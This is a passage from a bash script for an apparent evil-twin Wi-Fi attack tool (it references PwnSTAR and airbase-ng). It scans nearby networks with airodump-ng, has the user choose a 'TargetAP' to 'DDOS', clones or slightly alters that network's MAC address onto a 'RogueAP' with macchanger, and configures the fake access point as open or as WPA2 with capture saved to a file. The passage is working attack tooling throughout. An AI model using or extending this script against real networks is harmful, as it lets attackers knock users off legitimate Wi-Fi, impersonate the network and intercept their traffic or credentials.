cat < /tmp/airocap.txt | awk -F' ' '{ if($8 == "OPN") {print $1 " " $8 " " $9 " " $10 " " $11 " " $12 " " $13 " " $14 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/airocap2.txt

cat < /tmp/airocap.txt | awk -F' ' '{ if($8 == ".") {print $1 " " $9 " " $10 " " $11 " " $12 " " $13 " " $14 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' >> /tmp/airocap2.txt

cat /tmp/airocap2.txt >> /tmp/airocap1.txt

cat /tmp/airocap1.txt | unix2dos | sort -u > /tmp/airocap3.txt

cat < /tmp/airocap3.txt | awk '{print $1 }'  > /tmp/airocap4.txt

  ESSIDAVAIL=$(cat /tmp/airocap3.txt | nl -ba -w 1  -s ': ')

  BSSIDAVAIL=$(cat /tmp/airocap4.txt | nl -ba -w 1  -s ': ')

echo -e "$txtrst"
echo "$ESSIDAVAIL" | sed 's/^/       /'

	echo -e "$info     A list of existing Network addresses is shown above."
        echo ""
	echo -e "$inp     Enter the$yel line number$inp of mac address you wish to clone"
	echo -e "$inp  for the targetAP. $txtrst"
	echo""
	read  -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"

tarbssid=$(cat /tmp/airocap4.txt | sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

tarbssid=$(echo $tarbssid | xargs)


	while true
	do

echo ""
echo -e "$inp  You entered$yel $tarbssid$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read MACLONETEST

	case $MACLONETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

        clear

		fi

			echo $tarbssid > /tmp/blacklist


			fi

#############Setting Channel of TargetAP############################

  if [[ $CHOSEMCTAR == y ]] || [[ $CHOSEMCTAR == y ]]; then


ENTCHTARTEST=ZZZ

until  [[ $TARCHANTEST == y ]] || [[ $TARCHANTEST == Y ]]; do  

	clear
	echo ""
	echo -e "$bold$info  Entering The$yel TargetAP Channel$info Seen"
        echo -e "$warn  __________________________________$norm"
	echo ""
	echo -e "$info     Enter the Channel of the TargetAP seen in the"
	echo -e "$info  xterm window running the Airodump-ng all channel scan."
	echo -e "$info  The TargetAP mac address chosen is:"
	echo ""
	echo -e "$yel                    $tarbssid"
	echo ""
	echo -e "$inp     Enter$yel channel number$inp 1 thru 14 below.$txtrst"
        read tarchan

	while true
	do

echo ""
echo -e "$inp  You entered channel$yel $tarchan$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read TARCHANTEST

	case $TARCHANTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		if [[ $tarchan -lt 1 || $tarchan -gt 14 ]]; then

			echo -e "$warn Enter channels 1 thru 14 ONLY try again!!!$txrst"
			sleep 3
			TARCHANTEST=ZZZ

		fi 

		done

        clear

		fi  #if [[ $TARCHANTEST == y ]]


#############Setting Mac of RogueAP############################

CHOSEMCROGTEST=ZZZ

until  [[ $CHOSEMCROGTEST == y ]] || [[ $CHOSEMCROGTEST == Y ]]; do  
echo -e "$txtrst "
clear


	clear
	echo ""
	echo -e "$bold$info  Setting the$yel RogueAP$info Mac Address"
        echo -e "$warn  __________________________________$norm"
	echo ""
	echo -e "$q     Do you wish to enter a mac address for the RogueAP?"
	echo ""
	echo -e "$inp     Select$yel(y/Y)$inp to enter a mac address."
	echo -e "$inp  Enter$yel(n/N)$inp to skip this entry.$txtrst"
        read CHOSEMCROG

	while true
	do

echo ""
echo -e "$inp  You entered$yel $CHOSEMCROG$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read CHOSEMCROGTEST

	case $CHOSEMCROGTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

if [[ $CHOSEMCROG != y ]] && [[ $CHOSEMCROG != Y ]] && [[ $CHOSEMCROG != n ]] && [[ $CHOSEMCROG != N ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/Y/n/N)$warn ONLY - try again!!!"
	sleep 3
	CHOSEMCROGTEST=ZZZ

		fi


		done

        clear





if  [[ $CHOSEMCROG == y ]] || [[ $CHOSEMCROG == Y ]]; then


MANROGUETEST=ZZZ

until  [ $MANROGUETEST == y ] || [ $MANROGUETEST == Y ]; do

clear

echo -e "$txtrst"
echo -e "$bold$info  Selecting the RogueAP Mac Address"
echo -e "$warn  _________________________________$norm"
echo ""
echo -e "$q     Do you wish to$yel manually$q enter the mac address of the RogueAP?"
echo -e "$q  or$yel clone$q a mac address of an existing network from a menu list?"
echo ""
echo -e "$info  Note: Cloned mac addresses are copied from a list and cannot be altered."
echo""
echo -e "$info                            $q$undr Considerations $norm"
echo "" 
echo -e "$info     1. Only use the exact same mac address of TargetAP if no DDOS process"
echo -e "$info  will be employed"
echo -e "$info     2. If an exact same mac address as the TargetAP is used the DDOS process"
echo -e "$info  may affect both the TargetAP and the RogueAP making association to the"
echo -e "$info  RogueAP impossible."
echo -e "$info     3. A mac address similiar but slighly different can be used. For example"
echo -e "$info  if the TargetAPs' mac is 00:11:22:33:88:77 you could enter 00:11:22:33:B8:77"
echo -e "$info     4. A mac address consists of hex characters A thru F and 0 thru 9"

		if [[ ! -z $tarbssid ]]; then

echo -e "$info     5. For reference the current TargetAP = $yel$tarbssid"

		fi

echo ""
echo -e "$inp     Enter$yel (y/Y)$inp to manually enter a mac address."
echo -e "$inp  Enter$yel (n/N)$inp to clone a mac address from an existing network.$txtrst"
read MANROGUE

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$MANROGUE$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read MANROGUETEST

	case $MANROGUETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

if [[ $MANROGUE != y ]] && [[ $MANROGUE != Y ]] && [[ $MANROGUE != n ]] && [[ $MANROGUE != N ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/Y/n/N)$warn ONLY - try again!!!"
	sleep 3
	MANROGUETEST=ZZZ

		fi

		done


if [[ $MANROGUE == y ]] || [[ $MANROGUE == Y ]]; then

MACMANTEST=ZZZ

until  [[ $MACMANTEST == y ]] || [[ $MACMANTEST == Y ]]; do  
echo -e "$txtrst"
clear

#  WEP not required only Open and WPA
#  Note text output for single channel differs from -c hopping
#  Rescan on single -c  requires different handeling

#  Start the strip
#  Print WPA  airocap 1 for WPA

cat < /tmp/airocap.txt | awk -F' ' '{ if(($8 == "WPA2") || ($8 == "WPA")) {print $1 " " $8 " " $11 " " $12 " " $13 " " $14 " " $15 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/airocap1.txt

# Print Open ESSID

cat < /tmp/airocap.txt | awk -F' ' '{ if($8 == "OPN") {print $1 " " $8 " " $9 " " $10 " " $11 " " $12 " " $13 " " $14 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/airocap2.txt

cat < /tmp/airocap.txt | awk -F' ' '{ if($8 == ".") {print $1 " " $9 " " $10 " " $11 " " $12 " " $13 " " $14 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' >> /tmp/airocap2.txt

cat /tmp/airocap2.txt >> /tmp/airocap1.txt

cat /tmp/airocap1.txt | unix2dos | sort -u > /tmp/airocap3.txt

#cat < /tmp/airocap1.txt | awk '{print $1 }'  > /tmp/airocap4.txt

#ESSIDAVAIL=$(cat /tmp/airocap3.txt | nl -ba -w 1  -s ': ')

ESSIDAVAIL=$(cat /tmp/airocap3.txt)



echo -e "$txtrst"
echo "$ESSIDAVAIL" | sed 's/^/       /'

	echo ""
	echo -e "$info     A list of existing Networks for reference are shown above."
	echo -e "$info  You can drag the mouse across these addresses then copy, paste or"
	echo -e "$info  alter as required."
	echo ""
	echo -e "$info          Current TargetAP Mac Address = $yel$tarbssid$info"
	echo ""
	echo -e "$inp     Enter the mac address of RogueAP. Error handling exists"
	echo -e "$inp  for this entry. Enter in this format$yel 55:44:33:22:11:00$inp only!.$txtrst"
	read roguebssid

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$roguebssid$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read MACMANTEST

	case $MACMANTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

#####mac error test start
# Insure upper case to avoid problems w/ other programs

roguebssid=$(echo $roguebssid | awk '{print toupper($0)}')

MACPUNCT=":::::"
PUNCTEST=`echo "$roguebssid" | tr -d -c ".[:punct:]"`
MACALNUM=`echo "$roguebssid" | tr -d -c ".[:alnum:]"`

if [[ $MACALNUM =~ [0-9A-Fa-f]{12} ]]; then

	testhex=0

	else

	testhex=1

	fi

if [[ "$PUNCTEST" != "$MACPUNCT" ]] || [[ ${#roguebssid} != 17 ]] || [[ $testhex == 1 ]]; then

     echo -e "$warn  Mac Address FORMAT incorrect check length, symbol= : use hex character ONLY$txtrst"
	sleep 3

	MACMANTEST=ZZZ

	else

	echo -e "$info  Correct mac address format continuing...."
	sleep 3

		fi

#####mac error test end

		done

	fi #if [[ $MANROGUE == y ]]

if [[ $MANROGUE == n ]] || [[ $MANROGUE == N ]]; then

MACLONETEST=ZZZ

until  [[ $MACLONETEST == y ]] || [[ $MACLONETEST == Y ]]; do  
echo -e "$txtrst"
clear

#  WEP not required only Open and WPA
#  Note text output for single channel differs from -c hopping
#  Rescan on single -c  requires different handeling

#  Start the strip
#  Print WPA  airocap 1 for WPA

cat < /tmp/airocap.txt | awk -F' ' '{ if(($8 == "WPA2") || ($8 == "WPA")) {print $1 " " $8 " " $11 " " $12 " " $13 " " $14 " " $15 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/airocap1.txt

# Print Open ESSID

cat < /tmp/airocap.txt | awk -F' ' '{ if($8 == "OPN") {print $1 " " $8 " " $9 " " $10 " " $11 " " $12 " " $13 " " $14 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/airocap2.txt

cat < /tmp/airocap.txt | awk -F' ' '{ if($8 == ".") {print $1 " " $9 " " $10 " " $11 " " $12 " " $13 " " $14 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' >> /tmp/airocap2.txt

cat /tmp/airocap2.txt >> /tmp/airocap1.txt

cat /tmp/airocap1.txt | unix2dos | sort -u > /tmp/airocap3.txt

cat < /tmp/airocap3.txt | awk '{print $1 }'  > /tmp/airocap4.txt

  ESSIDAVAIL=$(cat /tmp/airocap3.txt | nl -ba -w 1  -s ': ')

  BSSIDAVAIL=$(cat /tmp/airocap4.txt | nl -ba -w 1  -s ': ')

echo -e "$txtrst"
echo "$ESSIDAVAIL" | sed 's/^/       /'

	echo -e "$info     A list of existing Network addresses are shown above"
        echo ""
	echo -e "$inp     Enter the$yel line number$inp of mac address you wish to clone"
	echo -e "$inp  for the RogueAP.$txtrst"
	read  -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"

roguebssid=$(cat /tmp/airocap4.txt | sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

roguebssid=$(echo $roguebssid | xargs)

	while true
	do

echo ""
echo -e "$inp  You entered$yel $roguebssid$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read MACLONETEST

	case $MACLONETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

        clear

		fi

# Kill airodump-ng before macchanging

        kill -9  $killairopid   
#	killall -q airodump-ng 2> /dev\null
#	killall -q xterm 2> /dev\null



sleep 2

clear
echo -e "$txtrst"
ifconfig $API down
iwconfig $API mode monitor
ifconfig $API up

ifconfig $API down &> /dev/null
macchanger -m $roguebssid $API
sleep 2  # Need time to complete op
ifconfig $API up

echo -e "$txtrst"
ifconfig $monap down
sleep .3
macchanger -m $roguebssid $monap
sleep 2 # Need time to complete op
ifconfig $monap up
sleep .3
ap_mac=$roguebssid #Set if random mac used of ap_mac null

ifconfig $API down
iwconfig $API mode monitor
ifconfig $API up

ifconfig $monap down
iwconfig $monap mode monitor
ifconfig $monap up

		fi #if  [[ $CHOSEMACROGUE == y ]]


				fi #if [ $initial_scan = "y"


#        var=1
#        while [[ -n $var ]];do # Clumsy I know. Enter zero's $var, ending the loop
            echo -e "$q\n     Closing the airodump-ng all-channel scan and continuing...."
	    sleep 3

#            read var
#        done
        # close airodump before allowing to proceed - prevents later problems with different channels on the same physical device
        killall -q airodump-ng &> /dev/null # output redirected so not seen in the terminal
        killall -q xterm &> /dev/null   # the previous "killall airodump" can leave the eterm open
	rm -f /tmp/airocap*.txt  # not really needed but keeps it clean
    
    elif [[ $initial_scan != n ]];then  # any value other than n restarts the function
        echo -e "$warn\nWhat's it gunna be babe...yes or no?"
        sleep 2

	rm -f /tmp/airocap*.txt  # not really needed but keeps it clean
        initial_scan_fn

    fi

}

monscan_start_fnXXOLDPOSITIOn()

{

	if [[ $use2nd == y ]] || [[ $use2nd == Y ]]; then

		echo -e "$info\n  Starting new monitor interface with 2nd device for scanning...$txtrst"
		sleep
		
		echo -e "$txtrst"
		ifconfig $use2dos down &> /dev/null
		sleep .1
		macchanger -A $use2dos
		sleep 2  # Need time for device complete op 
		ifconfig $use2dos up
		sleep .1

		if [[ $ifselect == old ]]; then

            VARMAC2=$(ifconfig $use2dos | awk '{print $5}')
            sleep 0.5
            VARMAC2=$(echo $VARMAC2 | awk '{print $1}')

			fi

		if [[ $ifselect == new ]]; then

VARMAC2=$(ifconfig $use2dos | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null

			fi

		echo -e "$txtrst"
		echo -e "$info\n Placing $use2dos in mode manage to change mac address $txtrst"
		ifconfig $use2dos down
		sleep .1
		iwconfig $use2dos mode manage &> /dev/null
		sleep .1
		ifconfig $use2dos up
		sleep .1
		ifconfig $twomon down
		sleep .1
		macchanger -m $VARMAC2 $twomon
		sleep 2 # Need time to complete op
		ifconfig $twomon up
		sleep .1
		ifconfig $use2dos down
		sleep .1
		iwconfig $use2dos mode monitor
		sleep .1
		ifconfig $use2dos up
		sleep .1
		monscan=$twomon

			fi

	if [[ $use2nd == n ]] || [[ $use2nd == N ]] && [[ $monap == mon0 ]]; then


		echo -e "$txtrst"
		echo -e "$info\n Placing $API in mode manage to change mac address $txtrst"
		ifconfig $API down
		sleep .1
		iwconfig $API mode manage &> /dev/null
		sleep .1
		ifconfig $API up
		sleep .1
		ifconfig mon1 down
		sleep .1
		macchanger -r mon1
		sleep 2 # Need time to complete op
		ifconfig mon1 up
		sleep .1
		ifconfig $API down
		sleep .1
		iwconfig $API mode monitor
		sleep .1
		ifconfig $API up
		sleep .1
		monscan=mon1

		fi

}

mon2scan_start_fn()
{
    if [[ -z $mon2scan ]];then # check hasn't been started in a previous loop through the script

	echo -e "$txtrst"
        echo -e "$info\n  Starting new monitor interface for scanning...$txtrst"
        mon2scan=$(airmon-old_fn start $API | grep enabled | awk '{ print $5"" }' | cut -c -4)
	sleep 1
	# Put device down 
	echo -e "$txtrst"
	echo -e "$info\n Placing $API in mode manage to change mac address $txtrst"
	ifconfig $API down
	sleep .1
	iwconfig $API mode manage &> /dev/null 
	sleep .1
	ifconfig $API up

        ifconfig $mon2scan down
        macchanger -A $mon2scan
	sleep 3
	#give time to complete op
	ifconfig $mon2scan up

	# Now avoid Network Manager put device monitor
	echo -e "$info\n Placing $API in mode monitor to avoid Network Manager conflicts $txtrst"
	ifconfig $API down
	iwconfig $API mode monitor 
	ifconfig $API up

	dev_check_var=$mon2scan
        dev_check_fn
        if [[ $dev_check == "fail" ]]; then
            monscan
            initial_scan_fn
        fi
        sleep 1
	echo -e "$txtrst"
        echo -e "$info\nMacchanging $monscan ...\n $txtrst"
        ifconfig $mon2scan down
        macchanger -A $mon2scan
	sleep 3
	#give time to complete op
	ifconfig $mon2scan up
	# give same mac as other AP interfaces
	# Now avoid Network Manager
	ifconfig $mon2scan down
	iwconfig $mon2scan mode monitor 
	ifconfig $mon2scan up

    fi
}


rescan_fn()
{

		if  [ ! -z $tarbssid ]; then

		echo ""
		echo -e "$info  Current TargetAP mac address to DDOS  = $yel$tarbssid$txtrst"
		echo ""

			fi

    echo -e "$q\nScan on: 1) channel $apchan only\n      or 2) All channels"
    read var
    if [[ $var != 1 && $var != 2 ]];then
        echo -e "$warn\nWhat's it gunna be babe...1 or 2?"
        sleep 2
        rescan=
        rescan_fn
    fi
    if [[ -z $monscan ]];then
        monscan_start_fn
    fi
#musket add --cmod "red" to all Eterm to remove crazy backgrounds
       
    killall -q airodump-ng &> /dev/null # stop any pre-existing scan
    kill -9 $scanpid &> /dev/null       # stop any pre-existing scan Eterm
    clear

    if [[ $var = 1 ]];then

#        Eterm -g 90x30-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -T "Scan channel $apchan" -e airodump-ng "$monscan" -c $apchan 2> /dev/null & scanpid=$!

        xterm -g 90x30-0-0 -T "Scan channel $apchan" -e airodump-ng "$monscan" -c $apchan 2> /dev/null & scanpid=$!

    else

        xterm -g 90x30-0-0 -T "Scan channel hop" -e airodump-ng "$monscan" 2> /dev/null & scanpid=$!

#        Eterm -g 90x30-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -T "Scan channel hop" -e airodump-ng "$monscan" 2> /dev/null & scanpid=$!

    fi


}

#debug Dead DNA
rescan_fn1()
{
clear
echo ""

		if  [ ! -z $tarbssid ]; then

		echo ""
		echo -e "$info  Current TargetAP mac address to DDOS  = $yel$tarbssid$txtrst"
		echo ""

			fi

	if [[ $use2nd == n ]] || [[ $use2nd == N ]]; then

    echo -e "$info     You Can Scan on Channel$yel $apchan$info Only!"
    echo -e "$info  To scan on other channels restart the program"
    echo -e "$inp  To rescan enter$yel (y/Y)$inp."
    echo -e "$inp  To scan on Channel$yel $apchan$info enter$yel (y/Y)$inp."
    echo -e "$inp  To skip the scan select$yel (n/N)$inp.$txtrst"
	read rescan
     if [[ $rescan != y && $rescan != Y && $rescan != n && $rescan != N ]];then

echo -e "$warn\n  Select y/Y or n/N Only?"
        sleep 2
        rescan=
        rescan_fn

     fi #if [[ $rescan != y && $rescan

	fi  #if [ -z  $use2dos

     if [[ $rescan == y ]]  || [[ $rescan == Y ]];then

	    	if [[ $use2nd == y ]] || [[ $use2nd == Y ]]; then

        	monscan_start_fn

    			fi

    killall -q airodump-ng &> /dev/null # stop any pre-existing scan
    kill -9 $scanpid &> /dev/null       # stop any pre-existing scan Eterm
    clear

        xterm -g 90x30-0-0 -T "airodump-ng rescan" -e "airodump-ng "$monscan" -c $tarchan 2>&1 | tee /tmp/airocap.txt" & scanpid=$!

	fi

	if [ ! -z  $use2dos ]; then

    echo -e "$q\nScan on: 1) channel $apchan only\n      or 2) All channels$txtrst"
    read var
    if [[ $var != 1 && $var != 2 ]];then
        echo -e "$warn\nWhat's it gunna be babe...1 or 2?"
        sleep 2
        rescan=
        rescan_fn
	    fi
    if [[ -z $monscan ]];then
        monscan_start_fn
   	 fi


    killall -q airodump-ng &> /dev/null # stop any pre-existing scan
    kill -9 $scanpid &> /dev/null       # stop any pre-existing scan Eterm
    clear
    if [[ $var = 1 ]];then

        xterm -g 90x30-0-0 -T "Scan channel $apchan" -e airodump-ng "$monscan" -c $apchan 2> /dev/null & scanpid=$!

    else

        xterm -g 90x30-0-0 -T "Scan channel hop" -e airodump-ng "$monscan" 2> /dev/null & scanpid=$!

    fi

	fi


   if [[ $rescan == y ]] || [[ $rescan == Y ]];then

############################################

RSCANTARGTEST=ZZZ

until [[ $RSCANTARGTEST == y ]] || [[ $RSCANTARGTEST == Y ]]; do

	clear
	echo ""
	echo -e ""
	echo -e "$info     Airodump-ng is scanning for available Networks."
	echo -e "$info"        
	echo ""
	echo -e "$inp     Select $yel (y)$inp to enter a$yel targetAP$inp mac address."
	echo -e "$inp  Select$yel (n)$inp to skip scan.$txtrst"
	read RSCANTARG

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$RSCANTARG$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read RSCANTARGTEST

	case $RSCANTARGTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

if [[ $RSCANTARG != y ]] && [[ $RSCANTARG != Y ]] && [[ $RSCANTARG != n ]] && [[ $RSCANTARG != N ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/Y/n/N)$warn ONLY - try again!!!"
	sleep 3
	RSCANTARGTEST=ZZZ

		fi

		done

		if [[ $RSCANTARG = y ]] || [[ $RSCANTARG = Y ]]; then

echo -e ""
echo -e "$info     You can manually enter a mac address for the targetAP or clone"
echo -e "$info  a mac address from a drop-down menu of Networks seen.$txtrst"
echo ""
echo -e "$info  Press$yel (c/C)$info when ready to continue....$txtrst"
read continue

MANTARGTEST=ZZZ

until  [[ $MANTARGTEST == y ]] || [[ $MANTARGTEST == Y ]]; do

echo -e "$txtrst "
clear

echo ""
echo -e "$info     You can manually enter the mac address for the targetAP or clone"
echo -e "$info  a mac address of an existing network from a menu list?$txtrst"
echo -e "$inp     Enter$yel (y/Y)$inp to manually enter a mac address."
echo -e "$inp  Enter$yel (n/N)$inp to clone a mac address from an existing network.$txtrst"
read MANTARG

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$MANTARG$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read MANTARGTEST

	case $MANTARGTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

if [[ $MANTARG != y ]] && [[ $MANTARG != Y ]] && [[ $MANTARG != n ]] && [[ $MANTARG != N ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/Y/n/N)$warn ONLY - try again!!!"
	sleep 3
	MANTARGTEST=ZZZ

		fi

		done


if [[ $MANTARG == y ]] || [[ $MANTARG == Y ]]; then

MACMANTEST=ZZZ

until  [[ $MACMANTEST == y ]] || [[ $MACMANTEST == Y ]]; do  
echo -e "$txtrst "
clear

#########################################

#  WEP not required only Open and WPA
#  Note text output for single channel differs from -c hopping
#  Rescan on single -c  requires different handeling

#  Start the strip
#  Print WPA  airocap 1 for WPA

cat < /tmp/airocap.txt | awk -F' ' '{ if(($9 == "WPA2") || ($9 == "WPA")) {print $1 " " $7 " " $9 " " $12 " " $13 " " $14 " " $15 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/airocap1.txt

# Print Open ESSID

cat < /tmp/airocap.txt | awk -F' ' '{ if($9 == "OPN") {print $1 " " $7 " " $9 " " $12 " " $13 " " $14 " " $15 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/airocap2.txt

cat < /tmp/airocap.txt | awk -F' ' '{ if($9 == ".") {print $1 " " $7 " " $9 " " $12 " " $13 " " $14 " " $15 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' >> /tmp/airocap2.txt

cat /tmp/airocap2.txt >> /tmp/airocap1.txt

cat /tmp/airocap1.txt | unix2dos | sort -u > /tmp/airocap3.txt

#cat < /tmp/airocap1.txt | awk '{print $1 }'  > /tmp/airocap4.txt

#  BSSIDAVAIL=$(cat /tmp/airocap4.txt | nl -ba -w 1  -s ': ')

ESSIDAVAIL=$(cat /tmp/airocap3.txt)


echo -e "$txtrst"
echo "$ESSIDAVAIL" | sed 's/^/       /'

	echo ""
	echo -e "$info     A list of existing Networks for reference ONLY are shown above."
	echo -e "$info  You can drag the mouse across these addresses then copy, paste or"
	echo -e "$info  alter as required."  
	echo -e "$inp     Enter the mac address of targetAP. No error handling exists"
	echo -e "$inp  for this entry. Enter in this format$yel 55:44:33:22:11:00$inp only!.$txtrst"

	read tarbssid

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$tarbssid$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read MACMANTEST

	case $MACMANTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done


#####mac error test start
# Insure upper case to avoid problems w/ other programs

tarbssid=$(echo $tarbssid | awk '{print toupper($0)}')

MACPUNCT=":::::"
PUNCTEST=`echo "$tarbssid" | tr -d -c ".[:punct:]"`
MACALNUM=`echo "$tarbssid" | tr -d -c ".[:alnum:]"`

if [[ $MACALNUM =~ [0-9A-Fa-f]{12} ]]; then

	testhex=0

	else

	testhex=1

	fi

if [[ "$PUNCTEST" != "$MACPUNCT" ]] || [[ ${#tarbssid} != 17 ]] || [[ $testhex == 1 ]]; then

     echo -e "$warn  Mac Address FORMAT incorrect check length, symbol= : use hex character ONLY$txtrst"
	sleep 3

	MACMANTEST=ZZZ

	else

	echo -e "$info  Correct mac address format continuing...."
	sleep 3

		fi

#####mac error test end

		done

	fi #if [[ $MANROGUE == y ]]

if [[ $MANTARG == n ]] || [[ $MANTARG == N ]]; then

MACLONETEST=ZZZ

until  [[ $MACLONETEST == y ]] || [[ $MACLONETEST == Y ]]; do  
echo -e "$txtrst"
clear

#########################################

#  WEP not required only Open and WPA
#  Note text output for single channel differs from -c hopping
#  Rescan on single -c  requires different handeling

#  Start the strip
#  Print WPA  airocap 1 for WPA

cat < /tmp/airocap.txt | awk -F' ' '{ if(($9 == "WPA2") || ($9 == "WPA")) {print $1 " " $7 " " $9 " " $12 " " $13 " " $14 " " $15 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/airocap1.txt

# Print Open ESSID

cat < /tmp/airocap.txt | awk -F' ' '{ if($9 == "OPN") {print $1 " " $7 " " $9 " " $12 " " $13 " " $14 " " $15 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/airocap2.txt

cat < /tmp/airocap.txt | awk -F' ' '{ if($9 == ".") {print $1 " " $7 " " $9 " " $12 " " $13 " " $14 " " $15 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' >> /tmp/airocap2.txt

cat /tmp/airocap2.txt >> /tmp/airocap1.txt

cat /tmp/airocap1.txt | unix2dos | sort -u > /tmp/airocap3.txt

cat < /tmp/airocap3.txt | awk '{print $1 }'  > /tmp/airocap4.txt

BSSIDAVAIL=$(cat /tmp/airocap4.txt | nl -ba -w 1  -s ': ')

ESSIDAVAIL=$(cat /tmp/airocap3.txt | nl -ba -w 1  -s ': ')

#########################################


echo -e "$txtrst"
echo "$ESSIDAVAIL" | sed 's/^/       /'
	echo  ""
	echo -e "$info     A list of existing Network addresses are shown above."
        echo ""
	echo -e "$inp     Enter the$yel line number$inp of mac address you wish to clone"
	echo -e "$inp  for the targetAP. $txtrst"
	read  -p "     Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"

tarbssid=$(cat /tmp/airocap4.txt | sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

tarbssid=$(echo $tarbssid | xargs)


	while true
	do

echo ""
echo -e "$inp  You entered$yel $tarbssid$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read MACLONETEST

	case $MACLONETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

        clear

		fi

			echo $tarbssid > /tmp/blacklist
#    killall -q airodump-ng &> /dev/null # stop any pre-existing scan
#    kill -9 $scanpid &> /dev/null       # stop any pre-existing xterm
#    clear 
			fi #if [[ $RSCANTARG = y

    killall -q airodump-ng &> /dev/null # stop any pre-existing scan
    kill -9 $scanpid &> /dev/null       # stop any pre-existing xterm
    clear 

	fi


############################################

}

# ~~~~~~~~~~ AP Functions ~~~~~~~~~~ #

ap_presets_fn()
{
	# Set your defaults here
	ap_ip="192.168.0.1" 		# SoftAP IP Address
	ap_sm="255.255.255.0" 		# SoftAP Subnet Mask
	apchan= 					# SoftAP Channel
	mtu_size=1400 				# MTU Size
	if [[ $apusage = 2 ]];then	# encryption type
		encrypt="WPA2"
        Z="-Z 4 -W 1 -F PwnSTAR" # variable for airbase: "Z 4 -W 1" basically means WPA2, -F saves a cap file
	else
		encrypt="open"
        Z=  		
	fi
	echo -e "$info\n  Interfaces set up; let's move onto the AP"
	sleep 1
    clear
}

ap_setup_fn()
{
	clear
	echo -e "$def

Set the RogueAP Parameters(Note targetAP channel = $tarchan):
	
	$inp 1$yel)$info RogueAP IP Address      \e[1;36m[$ap_ip]
	$def
	$inp 2$yel)$info RogueAP Subnet Mask     \e[1;36m[$ap_sm]
	$def
	$inp 3$yel)$info RogueAP Channel         \e[1;36m[$apchan]
	$def
	$inp 4$yel)$info MTU Size               \e[1;36m[$mtu_size]
	$def
	$inp 5$yel)$info Encryption type        \e[1;36m[$encrypt]       $WEPpswd
	$def
	
	$inp C$yel)$info Continue\n"
		read var
	case $var in
	
